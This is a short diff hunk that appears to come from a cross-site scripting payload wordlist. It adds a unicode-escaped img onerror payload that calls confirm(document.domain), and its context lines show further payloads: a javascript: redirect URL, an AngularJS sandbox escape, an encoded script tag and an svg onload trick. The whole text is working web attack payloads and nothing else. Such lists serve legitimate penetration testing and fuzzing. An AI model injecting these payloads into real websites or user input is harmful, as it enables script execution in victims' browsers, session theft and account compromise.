@@ -140,3 +140,4 @@ login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520docume
 {{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
 '%3e%3cscript%3ealert(5*5)%3c%2fscript%3eejj4sbx5w4o
 <svg onxss=() onload​='setTimeout`alert\x281\x29`'>
+\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\ u003e
